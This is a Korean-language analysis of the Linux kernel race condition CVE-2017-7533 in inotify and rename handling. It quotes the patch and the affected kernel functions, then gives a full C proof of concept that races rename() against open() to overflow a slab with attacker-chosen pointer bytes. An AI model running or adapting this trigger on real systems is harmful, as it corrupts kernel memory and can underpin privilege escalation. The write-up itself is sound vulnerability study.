# CVE-2017-7533



#### 작성자 : 조제진

미완성이라 뒤죽박죽

## Description

```text
A race condition was found in Linux kernel present since v3.14-rc1 upto v4.12
including. The race happens between threads of inotify_handle_event() and
vfs_rename() while running the rename operation against the same file. The next
slab data or the slab's free list pointer can be corrupted with attacker-controlled
data as a result of the race.
```

## Difference

CVE\_2017\_7533의 Diff를 분석한 결과 아래와 같은 차이를 보이고 있는데

패치 후에는  spinlock을 걸고 그 사이에 snapshot을 만들어서 사용하는 것을 알 수 있다.

따라서 snapshot을 만드는 순간부터 추적 해서 차이점이 무엇인지 확인했다.

{% code title="include\\linux\\dcache.h" %}
```c
...
...
...
#ifdef CONFIG_64BIT
# define DNAME_INLINE_LEN 32 /* 192 bytes */
#else
# ifdef CONFIG_SMP
#  define DNAME_INLINE_LEN 36 /* 128 bytes */
# else
#  define DNAME_INLINE_LEN 40 /* 128 bytes */
# endif
#endif
...
...
+struct name_snapshot {
+    const char *name;
+    char inline_name[DNAME_INLINE_LEN];
+};
+void take_dentry_name_snapshot(struct name_snapshot *, struct dentry *);
+void release_dentry_name_snapshot(struct name_snapshot *);
...
```
{% endcode %}

{% code title="Replace from fsnotify\_oldname\_init to  take\_dentry\_name\_snapshot" %}
```c
/* fsnotify_oldname_init - save off the old filename before we change it */
#if defined(CONFIG_FSNOTIFY)    /* notify helpers */
static inline const unsigned char *fsnotify_oldname_init(const unsigned char *name)
{ return kstrdup(name, GFP_KERNEL); }
#else    /* CONFIG_FSNOTIFY */
static inline const char *fsnotify_oldname_init(const unsigned char *name)
{ return NULL; }
/***************************************************/
void take_dentry_name_snapshot(struct name_snapshot *name, struct dentry *dentry)
{
    spin_lock(&dentry->d_lock);
    if (unlikely(dname_external(dentry))) {
        struct external_name *p = external_name(dentry);
        atomic_inc(&p->u.count);
        spin_unlock(&dentry->d_lock);
        name->name = p->name;
    } else {
        memcpy(name->inline_name, dentry->d_iname, DNAME_INLINE_LEN);
        spin_unlock(&dentry->d_lock);
        name->name = name->inline_name;
    }
}
EXPORT_SYMBOL(take_dentry_name_snapshot);
```
{% endcode %}

{% code title="Replace from fsnotify\_oldname\_free To release\_dentry\_name\_snapshot" %}
```c
/* fsnotify_oldname_free - free the name we got from fsnotify_oldname_init */
#if defined(CONFIG_FSNOTIFY)    /* notify helpers */
static inline void fsnotify_oldname_free(const unsigned char *old_name)
{ kfree(old_name); }
#else    /* CONFIG_FSNOTIFY */
static inline void fsnotify_oldname_free(const unsigned char *old_name)
{}
///////////////////////////////////////////////////////////////////////
void release_dentry_name_snapshot(struct name_snapshot *name){
    if (unlikely(name->name != name->inline_name)) {
        struct external_name *p;
        p = container_of(name->name, struct external_name, name[0]);
        if (unlikely(atomic_dec_and_test(&p->u.count)))
            kfree_rcu(p, u.head);
    }
}
EXPORT_SYMBOL(release_dentry_name_snapshot);
```
{% endcode %}

## Scenario

* CPU file\_name \(dentry-&gt;d\_name.name\)을 사용한다.
* CPU2의 copy\_name\(\) 는 dentry-&gt;d\_name.name에 새로운 filename을 넣는다.
* 따라서 lock이 없기 때문에 race condition에 의해서 heap overflaw가 발생한다.

```text
  inotify_handle_event(.., file_name)
   ㄴ strlen(file_name)  // file_name is "foobar"
      alloc_len += len + 1;    |
      event = kmalloc(alloc_len, GFP_KERNEL); // 7 bytes for the file_name
                               |
                               | sys_rename()
                               | ㄴ __d_move() [in fs/dcache.c]
                               |   ㄴ copy_name()
                               |     ㄴ rename to "foobar_lol_kek_u_pwned"
                               |
      strcpy(event->name, file_name);
  // now file_name points to "foobar_lol_kek_u_pwned"
  // but there is a space only for "foobar\0"
  // the next slab or slab's *freelist is corrupted with user controlled data
```

### inotify\_handle\_event \(fsnotify\)

* 공격 원리는 아래와 같은데 아래로는 이해가 되질 않아서 snapshot 이후부터 호출하는 순서들을 찾았다.
* innotify\_handle\_event &lt;-- send\_to\_group &lt;-- fsnotify &lt;-- \_\_fsnotify\_parent

{% tabs %}
{% tab title="innotify\_handle\_event" %}
{% code title="fs/notify/inotify/inotify\_fsnotify.c" %}
```c
int inotify_handle_event(struct fsnotify_group *group,
			 struct inode *inode,
			 struct fsnotify_mark *inode_mark,
			 struct fsnotify_mark *vfsmount_mark,
			 u32 mask, const void *data, int data_type,
			 const unsigned char *file_name, u32 cookie,
			 struct fsnotify_iter_info *iter_info)
{
	struct inotify_inode_mark *i_mark;
	struct inotify_event_info *event;
	struct fsnotify_event *fsn_event;
	int ret;
	int len = 0;
	int alloc_len = sizeof(struct inotify_event_info);

	BUG_ON(vfsmount_mark);

	if ((inode_mark->mask & FS_EXCL_UNLINK) &&
	    (data_type == FSNOTIFY_EVENT_PATH)) {
		const struct path *path = data;

		if (d_unlinked(path->dentry))
			return 0;
	}
	if (file_name) {
		len = strlen(file_name);
		alloc_len += len + 1;
	}

	pr_debug("%s: group=%p inode=%p mask=%x\n", __func__, group, inode,
		 mask);

	i_mark = container_of(inode_mark, struct inotify_inode_mark,
			      fsn_mark);

	event = kmalloc(alloc_len, GFP_KERNEL);
	if (unlikely(!event))
		return -ENOMEM;

	fsn_event = &event->fse;
	fsnotify_init_event(fsn_event, inode, mask);
	event->wd = i_mark->wd;
	event->sync_cookie = cookie;
	event->name_len = len;
	if (len)
		strcpy(event->name, file_name);

	ret = fsnotify_add_event(group, fsn_event, inotify_merge);
	if (ret) {
		/* Our event wasn't used in the end. Free it. */
		fsnotify_destroy_event(group, fsn_event);
	}

	if (inode_mark->mask & IN_ONESHOT)
		fsnotify_destroy_mark(inode_mark, group);

	return 0;
}
```
{% endcode %}
{% endtab %}

{% tab title="fsnotify\_ops" %}
{% code title="fs/notify/inotify/inotify\_fsnotify.c" %}
```c
const struct fsnotify_ops inotify_fsnotify_ops = {
	.handle_event = inotify_handle_event,
	.free_group_priv = inotify_free_group_priv,
	.free_event = inotify_free_event,
	.freeing_mark = inotify_freeing_mark,
	.free_mark = inotify_free_mark,
};
```
{% endcode %}
{% endtab %}

{% tab title="send\_to\_group" %}
{% code title="fs/notify/fsnotify.c" %}
```c

static int send_to_group(struct inode *to_tell,
			 struct fsnotify_mark *inode_mark,
			 struct fsnotify_mark *vfsmount_mark,
			 __u32 mask, const void *data,
			 int data_is, u32 cookie,
			 const unsigned char *file_name,
			 struct fsnotify_iter_info *iter_info)
{
	struct fsnotify_group *group = NULL;
	__u32 inode_test_mask = 0;
	__u32 vfsmount_test_mask = 0;

	if (unlikely(!inode_mark && !vfsmount_mark)) {
		BUG();
		return 0;
	}

	/* clear ignored on inode modification */
	if (mask & FS_MODIFY) {
		if (inode_mark &&
		    !(inode_mark->flags & FSNOTIFY_MARK_FLAG_IGNORED_SURV_MODIFY))
			inode_mark->ignored_mask = 0;
		if (vfsmount_mark &&
		    !(vfsmount_mark->flags & FSNOTIFY_MARK_FLAG_IGNORED_SURV_MODIFY))
			vfsmount_mark->ignored_mask = 0;
	}

	/* does the inode mark tell us to do something? */
	if (inode_mark) {
		group = inode_mark->group;
		inode_test_mask = (mask & ~FS_EVENT_ON_CHILD);
		inode_test_mask &= inode_mark->mask;
		inode_test_mask &= ~inode_mark->ignored_mask;
	}

	/* does the vfsmount_mark tell us to do something? */
	if (vfsmount_mark) {
		vfsmount_test_mask = (mask & ~FS_EVENT_ON_CHILD);
		group = vfsmount_mark->group;
		vfsmount_test_mask &= vfsmount_mark->mask;
		vfsmount_test_mask &= ~vfsmount_mark->ignored_mask;
		if (inode_mark)
			vfsmount_test_mask &= ~inode_mark->ignored_mask;
	}

	pr_debug("%s: group=%p to_tell=%p mask=%x inode_mark=%p"
		 " inode_test_mask=%x vfsmount_mark=%p vfsmount_test_mask=%x"
		 " data=%p data_is=%d cookie=%d\n",
		 __func__, group, to_tell, mask, inode_mark,
		 inode_test_mask, vfsmount_mark, vfsmount_test_mask, data,
		 data_is, cookie);

	if (!inode_test_mask && !vfsmount_test_mask)
		return 0;

	return group->ops->handle_event(group, to_tell, inode_mark,
					vfsmount_mark, mask, data, data_is,
					file_name, cookie, iter_info);
}
```
{% endcode %}
{% endtab %}

{% tab title="fsnotify" %}
{% code title="fs/notify/fsnotify.c" %}
```c
/*
 * This is the main call to fsnotify.  The VFS calls into hook specific functions
 * in linux/fsnotify.h.  Those functions then in turn call here.  Here will call
 * out to all of the registered fsnotify_group.  Those groups can then use the
 * notification event in whatever means they feel necessary.
 */
int fsnotify(struct inode *to_tell, __u32 mask, const void *data, int data_is,
	     const unsigned char *file_name, u32 cookie)
{
	struct hlist_node *inode_node = NULL, *vfsmount_node = NULL;
	struct fsnotify_mark *inode_mark = NULL, *vfsmount_mark = NULL;
	struct fsnotify_group *inode_group, *vfsmount_group;
	struct fsnotify_mark_connector *inode_conn, *vfsmount_conn;
	struct fsnotify_iter_info iter_info;
	struct mount *mnt;
	int ret = 0;
	/* global tests shouldn't care about events on child only the specific event */
	__u32 test_mask = (mask & ~FS_EVENT_ON_CHILD);

	if (data_is == FSNOTIFY_EVENT_PATH)
		mnt = real_mount(((const struct path *)data)->mnt);
	else
		mnt = NULL;

	/*
	 * Optimization: srcu_read_lock() has a memory barrier which can
	 * be expensive.  It protects walking the *_fsnotify_marks lists.
	 * However, if we do not walk the lists, we do not have to do
	 * SRCU because we have no references to any objects and do not
	 * need SRCU to keep them "alive".
	 */
	if (!to_tell->i_fsnotify_marks &&
	    (!mnt || !mnt->mnt_fsnotify_marks))
		return 0;
	/*
	 * if this is a modify event we may need to clear the ignored masks
	 * otherwise return if neither the inode nor the vfsmount care about
	 * this type of event.
	 */
	if (!(mask & FS_MODIFY) &&
	    !(test_mask & to_tell->i_fsnotify_mask) &&
	    !(mnt && test_mask & mnt->mnt_fsnotify_mask))
		return 0;

	iter_info.srcu_idx = srcu_read_lock(&fsnotify_mark_srcu);

	if ((mask & FS_MODIFY) ||
	    (test_mask & to_tell->i_fsnotify_mask)) {
		inode_conn = srcu_dereference(to_tell->i_fsnotify_marks,
					      &fsnotify_mark_srcu);
		if (inode_conn)
			inode_node = srcu_dereference(inode_conn->list.first,
						      &fsnotify_mark_srcu);
	}

	if (mnt && ((mask & FS_MODIFY) ||
		    (test_mask & mnt->mnt_fsnotify_mask))) {
		inode_conn = srcu_dereference(to_tell->i_fsnotify_marks,
					      &fsnotify_mark_srcu);
		if (inode_conn)
			inode_node = srcu_dereference(inode_conn->list.first,
						      &fsnotify_mark_srcu);
		vfsmount_conn = srcu_dereference(mnt->mnt_fsnotify_marks,
					         &fsnotify_mark_srcu);
		if (vfsmount_conn)
			vfsmount_node = srcu_dereference(
						vfsmount_conn->list.first,
						&fsnotify_mark_srcu);
	}

	/*
	 * We need to merge inode & vfsmount mark lists so that inode mark
	 * ignore masks are properly reflected for mount mark notifications.
	 * That's why this traversal is so complicated...
	 */
	while (inode_node || vfsmount_node) {
		inode_group = NULL;
		inode_mark = NULL;
		vfsmount_group = NULL;
		vfsmount_mark = NULL;

		if (inode_node) {
			inode_mark = hlist_entry(srcu_dereference(inode_node, &fsnotify_mark_srcu),
						 struct fsnotify_mark, obj_list);
			inode_group = inode_mark->group;
		}

		if (vfsmount_node) {
			vfsmount_mark = hlist_entry(srcu_dereference(vfsmount_node, &fsnotify_mark_srcu),
						    struct fsnotify_mark, obj_list);
			vfsmount_group = vfsmount_mark->group;
		}

		if (inode_group && vfsmount_group) {
			int cmp = fsnotify_compare_groups(inode_group,
							  vfsmount_group);
			if (cmp > 0) {
				inode_group = NULL;
				inode_mark = NULL;
			} else if (cmp < 0) {
				vfsmount_group = NULL;
				vfsmount_mark = NULL;
			}
		}

		iter_info.inode_mark = inode_mark;
		iter_info.vfsmount_mark = vfsmount_mark;

		ret = send_to_group(to_tell, inode_mark, vfsmount_mark, mask,
				    data, data_is, cookie, file_name,
				    &iter_info);

		if (ret && (mask & ALL_FSNOTIFY_PERM_EVENTS))
			goto out;

		if (inode_group)
			inode_node = srcu_dereference(inode_node->next,
						      &fsnotify_mark_srcu);
		if (vfsmount_group)
			vfsmount_node = srcu_dereference(vfsmount_node->next,
							 &fsnotify_mark_srcu);
	}
	ret = 0;
out:
	srcu_read_unlock(&fsnotify_mark_srcu, iter_info.srcu_idx);

	return ret;
}
EXPORT_SYMBOL_GPL(fsnotify);

```
{% endcode %}
{% endtab %}

{% tab title="\_\_fsnotify\_parent" %}
{% code title="fs/notify/fsnotify.c" %}
```c
/* Notify this dentry's parent about a child's events. */
int __fsnotify_parent(const struct path *path, struct dentry *dentry, __u32 mask)
{
	struct dentry *parent;
	struct inode *p_inode;
	int ret = 0;

	if (!dentry)
		dentry = path->dentry;

	if (!(dentry->d_flags & DCACHE_FSNOTIFY_PARENT_WATCHED))
		return 0;

	parent = dget_parent(dentry);
	p_inode = parent->d_inode;

	if (unlikely(!fsnotify_inode_watches_children(p_inode)))
		__fsnotify_update_child_dentry_flags(p_inode);
	else if (p_inode->i_fsnotify_mask & mask) {
		/* we are notifying a parent so come up with the new mask which
		 * specifies these are events which came from a child. */
		mask |= FS_EVENT_ON_CHILD;

		if (path)
			ret = fsnotify(p_inode, mask, path, FSNOTIFY_EVENT_PATH,
				       dentry->d_name.name, 0);
		else
			ret = fsnotify(p_inode, mask, dentry->d_inode, FSNOTIFY_EVENT_INODE,
				       dentry->d_name.name, 0);
	}

	dput(parent);

	return ret;
}
EXPORT_SYMBOL_GPL(__fsnotify_parent);
```
{% endcode %}
{% endtab %}
{% endtabs %}

### copy\_name \(sys\_name\)

* copy\_name &lt;- - \_\_d\_move &lt;-- d\_move &lt;-- vfs\_name &lt;-- sys\_name

{% tabs %}
{% tab title="copy\_name" %}
{% code title="fs/dcache.c" %}
```c
static void copy_name(struct dentry *dentry, struct dentry *target)
{
	struct external_name *old_name = NULL;
	if (unlikely(dname_external(dentry)))
		old_name = external_name(dentry);
	if (unlikely(dname_external(target))) {
		atomic_inc(&external_name(target)->u.count);
		dentry->d_name = target->d_name;
	} else {
		memcpy(dentry->d_iname, target->d_name.name,
				target->d_name.len + 1);
		dentry->d_name.name = dentry->d_iname;
		dentry->d_name.hash_len = target->d_name.hash_len;
	}
	if (old_name && likely(atomic_dec_and_test(&old_name->u.count)))
		kfree_rcu(old_name, u.head);
}
```
{% endcode %}
{% endtab %}

{% tab title="\_\_d\_move" %}
{% code title="fs/dcache.c" %}
```c
/*
 * When switching names, the actual string doesn't strictly have to
 * be preserved in the target - because we're dropping the target
 * anyway. As such, we can just do a simple memcpy() to copy over
 * the new name before we switch, unless we are going to rehash
 * it.  Note that if we *do* unhash the target, we are not allowed
 * to rehash it without giving it a new name/hash key - whether
 * we swap or overwrite the names here, resulting name won't match
 * the reality in filesystem; it's only there for d_path() purposes.
 * Note that all of this is happening under rename_lock, so the
 * any hash lookup seeing it in the middle of manipulations will
 * be discarded anyway.  So we do not care what happens to the hash
 * key in that case.
 */
/*
 * __d_move - move a dentry
 * @dentry: entry to move
 * @target: new dentry
 * @exchange: exchange the two dentries
 *
 * Update the dcache to reflect the move of a file name. Negative
 * dcache entries should not be moved in this way. Caller must hold
 * rename_lock, the i_mutex of the source and target directories,
 * and the sb->s_vfs_rename_mutex if they differ. See lock_rename().
 */
static void __d_move(struct dentry *dentry, struct dentry *target,
		     bool exchange)
{
	struct inode *dir = NULL;
	unsigned n;
	if (!dentry->d_inode)
		printk(KERN_WARNING "VFS: moving negative dcache entry\n");

	BUG_ON(d_ancestor(dentry, target));
	BUG_ON(d_ancestor(target, dentry));

	dentry_lock_for_move(dentry, target);
	if (unlikely(d_in_lookup(target))) {
		dir = target->d_parent->d_inode;
		n = start_dir_add(dir);
		__d_lookup_done(target);
	}

	write_seqcount_begin(&dentry->d_seq);
	write_seqcount_begin_nested(&target->d_seq, DENTRY_D_LOCK_NESTED);

	/* unhash both */
	/* __d_drop does write_seqcount_barrier, but they're OK to nest. */
	__d_drop(dentry);
	__d_drop(target);

	/* Switch the names.. */
	if (exchange)
		swap_names(dentry, target);
	else
		copy_name(dentry, target);

	/* rehash in new place(s) */
	__d_rehash(dentry);
	if (exchange)
		__d_rehash(target);

	/* ... and switch them in the tree */
	if (IS_ROOT(dentry)) {
		/* splicing a tree */
		dentry->d_flags |= DCACHE_RCUACCESS;
		dentry->d_parent = target->d_parent;
		target->d_parent = target;
		list_del_init(&target->d_child);
		list_move(&dentry->d_child, &dentry->d_parent->d_subdirs);
	} else {
		/* swapping two dentries */
		swap(dentry->d_parent, target->d_parent);
		list_move(&target->d_child, &target->d_parent->d_subdirs);
		list_move(&dentry->d_child, &dentry->d_parent->d_subdirs);
		if (exchange)
			fsnotify_update_flags(target);
		fsnotify_update_flags(dentry);
	}

	write_seqcount_end(&target->d_seq);
	write_seqcount_end(&dentry->d_seq);

	if (dir)
		end_dir_add(dir, n);
	dentry_unlock_for_move(dentry, target);
}
```
{% endcode %}
{% endtab %}

{% tab title="d\_move" %}
{% code title="fs/dcache.c" %}
```c
/*
 * d_move - move a dentry
 * @dentry: entry to move
 * @target: new dentry
 *
 * Update the dcache to reflect the move of a file name. Negative
 * dcache entries should not be moved in this way. See the locking
 * requirements for __d_move.
 */
void d_move(struct dentry *dentry, struct dentry *target)
{
	write_seqlock(&rename_lock);
	__d_move(dentry, target, false);
	write_sequnlock(&rename_lock);
}
EXPORT_SYMBOL(d_move);
```
{% endcode %}
{% endtab %}

{% tab title="vfs\_name" %}
{% code title="ffs/namei.c" %}
```c
/**
 * vfs_rename - rename a filesystem object
 * @old_dir:	parent of source
 * @old_dentry:	source
 * @new_dir:	parent of destination
 * @new_dentry:	destination
 * @delegated_inode: returns an inode needing a delegation break
 * @flags:	rename flags
 *
 * The caller must hold multiple mutexes--see lock_rename()).
 *
 * If vfs_rename discovers a delegation in need of breaking at either
 * the source or destination, it will return -EWOULDBLOCK and return a
 * reference to the inode in delegated_inode.  The caller should then
 * break the delegation and retry.  Because breaking a delegation may
 * take a long time, the caller should drop all locks before doing
 * so.
 *
 * Alternatively, a caller may pass NULL for delegated_inode.  This may
 * be appropriate for callers that expect the underlying filesystem not
 * to be NFS exported.
 *
 * The worst of all namespace operations - renaming directory. "Perverted"
 * doesn't even start to describe it. Somebody in UCB had a heck of a trip...
 * Problems:
 *	a) we can get into loop creation.
 *	b) race potential - two innocent renames can create a loop together.
 *	   That's where 4.4 screws up. Current fix: serialization on
 *	   sb->s_vfs_rename_mutex. We might be more accurate, but that's another
 *	   story.
 *	c) we have to lock _four_ objects - parents and victim (if it exists),
 *	   and source (if it is not a directory).
 *	   And that - after we got ->i_mutex on parents (until then we don't know
 *	   whether the target exists).  Solution: try to be smart with locking
 *	   order for inodes.  We rely on the fact that tree topology may change
 *	   only under ->s_vfs_rename_mutex _and_ that parent of the object we
 *	   move will be locked.  Thus we can rank directories by the tree
 *	   (ancestors first) and rank all non-directories after them.
 *	   That works since everybody except rename does "lock parent, lookup,
 *	   lock child" and rename is under ->s_vfs_rename_mutex.
 *	   HOWEVER, it relies on the assumption that any object with ->lookup()
 *	   has no more than 1 dentry.  If "hybrid" objects will ever appear,
 *	   we'd better make sure that there's no link(2) for them.
 *	d) conversion from fhandle to dentry may come in the wrong moment - when
 *	   we are removing the target. Solution: we will have to grab ->i_mutex
 *	   in the fhandle_to_dentry code. [FIXME - current nfsfh.c relies on
 *	   ->i_mutex on parents, which works but leads to some truly excessive
 *	   locking].
 */
int vfs_rename(struct inode *old_dir, struct dentry *old_dentry,
	       struct inode *new_dir, struct dentry *new_dentry,
	       struct inode **delegated_inode, unsigned int flags)
{
	int error;
	bool is_dir = d_is_dir(old_dentry);
	const unsigned char *old_name;
	struct inode *source = old_dentry->d_inode;
	struct inode *target = new_dentry->d_inode;
	bool new_is_dir = false;
	unsigned max_links = new_dir->i_sb->s_max_links;

	if (source == target)
		return 0;

	error = may_delete(old_dir, old_dentry, is_dir);
	if (error)
		return error;

	if (!target) {
		error = may_create(new_dir, new_dentry);
	} else {
		new_is_dir = d_is_dir(new_dentry);

		if (!(flags & RENAME_EXCHANGE))
			error = may_delete(new_dir, new_dentry, is_dir);
		else
			error = may_delete(new_dir, new_dentry, new_is_dir);
	}
	if (error)
		return error;

	if (!old_dir->i_op->rename)
		return -EPERM;

	/*
	 * If we are going to change the parent - check write permissions,
	 * we'll need to flip '..'.
	 */
	if (new_dir != old_dir) {
		if (is_dir) {
			error = inode_permission(source, MAY_WRITE);
			if (error)
				return error;
		}
		if ((flags & RENAME_EXCHANGE) && new_is_dir) {
			error = inode_permission(target, MAY_WRITE);
			if (error)
				return error;
		}
	}

	error = security_inode_rename(old_dir, old_dentry, new_dir, new_dentry,
				      flags);
	if (error)
		return error;

	old_name = fsnotify_oldname_init(old_dentry->d_name.name);
	dget(new_dentry);
	if (!is_dir || (flags & RENAME_EXCHANGE))
		lock_two_nondirectories(source, target);
	else if (target)
		inode_lock(target);

	error = -EBUSY;
	if (is_local_mountpoint(old_dentry) || is_local_mountpoint(new_dentry))
		goto out;

	if (max_links && new_dir != old_dir) {
		error = -EMLINK;
		if (is_dir && !new_is_dir && new_dir->i_nlink >= max_links)
			goto out;
		if ((flags & RENAME_EXCHANGE) && !is_dir && new_is_dir &&
		    old_dir->i_nlink >= max_links)
			goto out;
	}
	if (is_dir && !(flags & RENAME_EXCHANGE) && target)
		shrink_dcache_parent(new_dentry);
	if (!is_dir) {
		error = try_break_deleg(source, delegated_inode);
		if (error)
			goto out;
	}
	if (target && !new_is_dir) {
		error = try_break_deleg(target, delegated_inode);
		if (error)
			goto out;
	}
	error = old_dir->i_op->rename(old_dir, old_dentry,
				       new_dir, new_dentry, flags);
	if (error)
		goto out;

	if (!(flags & RENAME_EXCHANGE) && target) {
		if (is_dir)
			target->i_flags |= S_DEAD;
		dont_mount(new_dentry);
		detach_mounts(new_dentry);
	}
	if (!(old_dir->i_sb->s_type->fs_flags & FS_RENAME_DOES_D_MOVE)) {
		if (!(flags & RENAME_EXCHANGE))
			d_move(old_dentry, new_dentry);
		else
			d_exchange(old_dentry, new_dentry);
	}
out:
	if (!is_dir || (flags & RENAME_EXCHANGE))
		unlock_two_nondirectories(source, target);
	else if (target)
		inode_unlock(target);
	dput(new_dentry);
	if (!error) {
		fsnotify_move(old_dir, new_dir, old_name, is_dir,
			      !(flags & RENAME_EXCHANGE) ? target : NULL, old_dentry);
		if (flags & RENAME_EXCHANGE) {
			fsnotify_move(new_dir, old_dir, old_dentry->d_name.name,
				      new_is_dir, NULL, new_dentry);
		}
	}
	fsnotify_oldname_free(old_name);

	return error;
}
EXPORT_SYMBOL(vfs_rename);
```
{% endcode %}
{% endtab %}
{% endtabs %}

## POC

{% tabs %}
{% tab title="Plain Text" %}
```text
너무 길어서 옆으로 빼둿
```
{% endtab %}

{% tab title="POC" %}
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <signal.h>
#include <sys/eventfd.h>
#include <sys/inotify.h>
#include <sys/mman.h>
#include <ctype.h>
#include <errno.h>
#include <err.h>
#include <poll.h>
#include <unistd.h>

void *callrename( void *ptr );
void *openclose( void *ptr );
pthread_t thread1, thread2;
int lastfd;
char *space;
int original,printed, *int_space;

volatile int stop = 0;

// Try kmalloc-192 made by cyclic(100)
char *orig_name = "f";

static void handle_events(int fd, int *wd, int argc, char* argv[])
{

   char buf[4096]
       __attribute__ ((aligned(__alignof__(struct inotify_event))));
   const struct inotify_event *event;
   int i;
   ssize_t len;
   char *ptr;

   /* Loop while events can be read from inotify file descriptor. */

   for (;;) {

       /* Read some events. */

       len = read(fd, buf, sizeof buf);
       if (len == -1 && errno != EAGAIN) {
           perror("read");
           exit(EXIT_FAILURE);
       }

       if (len <= 0)
           break;

       for (ptr = buf; ptr < buf + len;
               ptr += sizeof(struct inotify_event) + event->len) {

           event = (const struct inotify_event *) ptr;

           for (i = 1; i < argc; ++i) {
               if (wd[i] == event->wd) {
                   //printf("%s/", argv[i]);
                   break;
               }
           }

           if (event->len && strcmp(event->name, orig_name)) {
               printf("%s() event->name : %s, event->len : %d\n",__func__, event->name, event->len);

                if ( !strcmp(event->name, "b") && strlen(event->name) == 1) {
                    printf("Detected overwrite!!!\n");
                    stop = 1;
                    break;
                }
           }
       }
   }
}

static void* notify_thread_func(void* arg) 
{
   char buf;
   int fd, i, poll_num;
   int *wd;
   nfds_t nfds;
   struct pollfd fds[2];

   int argc = 2;
   char *argv[] = { NULL, "test_dir", NULL};

   fd = inotify_init1(IN_NONBLOCK);
   if (fd == -1) {
       perror("inotify_init1");
       exit(EXIT_FAILURE);
   }

   wd = calloc(argc, sizeof(int));
   if (wd == NULL) {
       perror("calloc");
       exit(EXIT_FAILURE);
   }

   for (i = 1; i < argc; i++) {
       wd[i] = inotify_add_watch(fd, argv[i],
                                 IN_OPEN | IN_CLOSE| IN_ACCESS);
       if (wd[i] == -1) {
           fprintf(stderr, "Cannot watch '%s'\n", argv[i]);
           perror("inotify_add_watch");
           exit(EXIT_FAILURE);
       }
   }

   /* Prepare for polling */

   nfds = 2;

   /* Console input */

   fds[0].fd = STDIN_FILENO;
   fds[0].events = POLLIN;

   /* Inotify input */

   fds[1].fd = fd;
   fds[1].events = POLLIN;

   printf("Listening for events.\n");
   while (!stop) {
       poll_num = poll(fds, nfds, -1);
       if (poll_num == -1) {
           if (errno == EINTR)
               continue;
           perror("poll");
           exit(EXIT_FAILURE);
       }

       if (poll_num > 0) {

           if (fds[1].revents & POLLIN) {

               handle_events(fd, wd, argc, argv);
           }
       }
   }

   close(fd);

   free(wd);
   exit(EXIT_SUCCESS);
}

void *trigger_rename_open(void* arg)
{
     int  iret1, iret2,i;

     setvbuf(stdout,0,2,0);

     iret1 = pthread_create( &thread1, NULL, callrename, NULL);
     if(iret1)
     {
         fprintf(stderr,"Error - pthread_create() return code: %d\n",iret1);
         exit(EXIT_FAILURE);
     }
     
     iret2 = pthread_create( &thread2, NULL, openclose, NULL);
     if(iret2)
     {
         fprintf(stderr,"Error - pthread_create() return code: %d\n",iret2);
         exit(EXIT_FAILURE);
     }
     pthread_join( thread1, NULL);
     pthread_join( thread2, NULL);
     exit(EXIT_SUCCESS);
}


// 250
char *longname_padding =   "bbbb3210321032103210";

void *callrename( void *ptr )
{
    int i,m,k;
    char enter = 0;
    char origname[1024];
    char longname[1024];
    char next_ptr[8] = "\x30\xff\xff\x31\xff\xff\xff\xff"; 
    char prev_ptr[8] = ""; 
    snprintf(origname, sizeof origname, "test_dir/%s", orig_name);
    printf("alloc_len : %d\n", 48 + strlen(orig_name)+1);
    //printf("origname=\"%s\"\n", origname);
    
    snprintf(longname, sizeof longname, "test_dir/%s%s%s", 
             longname_padding, next_ptr, prev_ptr);
    //strcat(longname,space);
    printf("longname=\"%s\"\n", longname);

    for (i=0;i<10000 && !stop ;i++)
    {
        if (rename(origname,longname)<0) perror("rename1");
        if (rename(longname,origname)<0) perror("rename2");
        
    }

    printf("callrename done.\n");
}

void *openclose( void *ptr )
{
    int j,fd,m,k;
    char origname[1024];
    snprintf(origname, sizeof origname, "test_dir/%s", orig_name);

    for (j=0;j<8000 && !stop;j++ )
    {
        open(origname,O_RDWR);

    }
    printf("alloc_len : %d\n", 48 + strlen(orig_name)+1);

}


void main(void) 
{
    pthread_t notify_thread[4];
    pthread_t rename_thread;
    int i = 0;
    
    char buf[1024];
    snprintf(buf, sizeof buf, "touch test_dir/%s", orig_name);
    system("rm -rf /data/local/tmp/test_dir ; mkdir test_dir");
    system(buf);

    for ( i ; i < 2; i++ ) {
        pthread_create(&notify_thread[i], 
                       NULL, 
                       notify_thread_func, 
                       NULL);
    }

    pthread_create(&rename_thread, NULL, trigger_rename_open, NULL);

    pthread_join(rename_thread, NULL);
    for ( i = 0; i < 2; i++ )
        pthread_join(notify_thread[i], NULL);

}
```
{% endtab %}

{% tab title="inotify\_add\_watch" %}
{% code title="fs/notify/inotify/inotify\_user.c" %}
```c
SYSCALL_DEFINE3(inotify_add_watch, int, fd, const char __user *, pathname,
		u32, mask)
{
	struct fsnotify_group *group;
	struct inode *inode;
	struct path path;
	struct fd f;
	int ret;
	unsigned flags = 0;

	/*
	 * We share a lot of code with fs/dnotify.  We also share
	 * the bit layout between inotify's IN_* and the fsnotify
	 * FS_*.  This check ensures that only the inotify IN_*
	 * bits get passed in and set in watches/events.
	 */
	if (unlikely(mask & ~ALL_INOTIFY_BITS))
		return -EINVAL;
	/*
	 * Require at least one valid bit set in the mask.
	 * Without _something_ set, we would have no events to
	 * watch for.
	 */
	if (unlikely(!(mask & ALL_INOTIFY_BITS)))
		return -EINVAL;

	f = fdget(fd);
	if (unlikely(!f.file))
		return -EBADF;

	/* verify that this is indeed an inotify instance */
	if (unlikely(f.file->f_op != &inotify_fops)) {
		ret = -EINVAL;
		goto fput_and_out;
	}

	if (!(mask & IN_DONT_FOLLOW))
		flags |= LOOKUP_FOLLOW;
	if (mask & IN_ONLYDIR)
		flags |= LOOKUP_DIRECTORY;

	ret = inotify_find_inode(pathname, &path, flags);
	if (ret)
		goto fput_and_out;

	/* inode held in place by reference to path; group by fget on fd */
	inode = path.dentry->d_inode;
	group = f.file->private_data;

	/* create/update an inode mark */
	ret = inotify_update_watch(group, inode, mask);
	path_put(&path);
fput_and_out:
	fdput(f);
	return ret;
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Etc

{% tabs %}
{% tab title="Plain Text" %}
```text
혼자 보기위한 칸
```
{% endtab %}

{% tab title="스압주의" %}
    struct qstr d_name;
    unsigned char d_imame[DNAME_INLINE_LEN] /*small names*/
    take_dentry_name_snapshot의 구조는 d_name와 d_image의 주소가 같으면 굳이 mencpy를 하지 않는 것 같다.


